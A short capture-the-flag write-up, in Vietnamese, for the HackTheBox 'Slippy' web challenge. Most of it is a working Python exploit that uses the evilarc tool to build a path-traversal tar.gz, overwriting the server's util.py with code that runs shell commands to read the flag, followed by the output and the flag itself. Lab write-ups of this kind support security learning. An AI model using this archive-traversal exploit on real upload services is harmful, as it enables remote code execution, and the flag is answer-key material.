# __Slippy__
</br> [source](https://github.com/magnetohvcs/CTF/raw/main/ctf-hackthebox/Uni%20CTF%202021%20Quals/src/web_slippy.zip)

 __tóm tắt__ : cố gắng upload file tar.gz để lấy flag, ta không thể dùng symlinks để cố gắng truy cập file flag mà ta sẽ dùng [công cụ này](https://github.com/ptoomey3/evilarc). 
 
 </br> Đầu tiên tải [evilary](https://github.com/ptoomey3/evilarc) và sau đó chạy đoạn mã này
 
 ```
 import requests, os, json, time
s = requests.session()

ip_port = '64.227.40.93:32528' # change this
url = 'http://%s/api/unslippy'%ip_port
util = '''
import functools, tarfile, tempfile, os
from application import main

generate = lambda x: os.urandom(x).hex()

def extract_from_archive(file):
    return [os.popen('ls -al && cat flag').read()]
''' 

open('util.py','w').write(util)
path_evilary = '~/evilarc/evilarc.py' # change  this
os.system('python2 %s -d 3 -o u -f flag.tar.gz util.py'%path_evilary)
s.post(url,files={'file':open('flag.tar.gz','rb')})
time.sleep(2)
res = s.post(url,files={'file':open('flag.tar.gz','rb')}).text
print(json.loads(res)['list'][0])

# HTB{i_slipped_my_way_to_rce}
```
__output__
```
Creating flag.tar.gz containing ../../../util.py
total 28
drwxr-xr-x    1 root     root          4096 Nov 16 23:46 .
drwxr-xr-x    1 root     root          4096 Nov 23 06:25 ..
drwxr-xr-x    1 root     root          4096 Nov 23 06:25 application
-rw-r--r--    1 root     root            29 Nov 16 10:45 flag
-rw-r--r--    1 root     root            98 Nov 15 13:22 run.py
HTB{i_slipped_my_way_to_rce}
```
